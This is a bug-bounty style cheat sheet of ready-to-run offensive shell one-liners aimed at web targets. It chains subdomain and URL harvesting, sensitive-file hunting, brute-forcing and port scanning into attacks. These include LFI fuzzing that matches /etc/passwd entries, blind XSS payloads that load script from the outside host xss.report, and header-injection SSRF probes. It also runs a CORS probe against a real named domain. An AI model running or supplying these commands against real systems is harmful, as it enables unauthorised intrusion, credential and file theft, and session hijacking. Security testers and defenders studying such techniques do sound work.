# Advanced-Recon-Methodology
#For finding subdomains

**subfinder -d example.com -all -recursive > subdomain.txt**

#For filter out live subdomains

cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt

#For fetching passive urls

katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt

#For finding sensitive files

cat allurls.txt | grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5'

#For fetch and sorting urls - part 1

echo example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txt

#For fetch and sorting urls - part 2

katana -u https://example.com -d 5 | grep '=' | urldedupe | anew output.txt

#For fetch and sorting urls - part 3

cat output.txt | sed 's/=.*/=/' >final.txt

#For fetch and sorting urls - part 4

echo example.com | gau --mc 200 | urldedupe >urls.txt

#For fetch and sorting urls - part 5

cat urls.txt | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '=' | sort > output.txt

#For fetch and sorting urls - part 6

cat output.txt | sed 's/=.*/=/' >final.txt

#For finding hidden parameter - part 1

arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers 'User-Agent: Mozilla/5.0'

#For finding hidden parameter - part 2

arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers 'User-Agent: Mozilla/5.0'

#For checking CORS - part 1

curl -H 'Origin: http://example.com' -I https://etoropartners.com/wp-json/

#For checking CORS - part 2

curl -H 'Origin: http://example.com' -I https://etoropartners.com/wp-json/ | grep -i -e 'access-control-allow-origin' -e 'access-control-allow-methods' -e 'access-control-allow-credentials'

#Information Disclosure dork

site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)

#Wordpress aggressive scanning

wpscan --url https://site.com --disable-tls-checks --api-token <here> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force

#LFI methodology

echo 'https://example.com/' | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace 'FUZZ' | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr 'root:(x|\*|\$[^\:]*):0:0:' -v

#Directory Bruteforce - part 1

dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1

#Directory Bruteforce - part 2

ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Forwarded-Host: localhost' -t 100 -r -o results.json

#JS File hunting - part 1

echo example.com | katana -d 5 | grep -E '\.js$' | nuclei -t nuclei-templates/http/exposures/ -c 30

#JS File hunting - part 2

cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/

#For Checking Subdomain takeover

subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl

#For finding CORS

python3 corsy.py -i subdomains_alive.txt -t 10 --headers 'User-Agent: GoogleBot\nCookie: SESSION=Hacked'

#For testing header based blind xss

subfinder -d example.com | gau | bxss -payload ''><script src=https://xss.report/c/coffinxp></script>' -header 'X-Forwarded-For'

#For checking single xss on all urls

echo 'example.com ' | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln

#For finding Blind xss

subfinder -d example.com | gau | grep '&' | bxss -appendMode -payload ''><script src=https://xss.report/c/coffinxp></script>' -parameters

#Content-type Filter - part 1

echo domain | gau | grep -Eo '(\/[^\/]+)\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'

#Shodan dork

Ssl.cert.subject.CN:'example.com' 200

#XSS method - part 1

echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt

#XSS method - part 2

cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > final.txt

#Naabu scan

naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt

#Nmap scan

nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan

#Masscan

masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt

#FFUF request file method - part 1

ffuf -request lfi -request-proto https -w /root/wordlists/offensive\ payloads/LFI\ payload.txt -c -mr 'root:'

#FFUF request file method - part 2

ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr '<script>alert('XSS')</script>'

#XSS and SSRF testing with headers

cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e '\e[1;32m$url\e[0m''\n''Method[1] X-Forwarded-For: xss+ssrf => $xss1''\n''Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2''\n''Method[3] Host: xss+ssrf ==> $xss3''\n''Method[4] GET http://xss.yourburpcollabrotor HTTP/1.1 ''\n';done

#LFI methodology - alternative method

echo 'https://example.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr 'root:(x|\*|\$[^\:]*):0:0:'
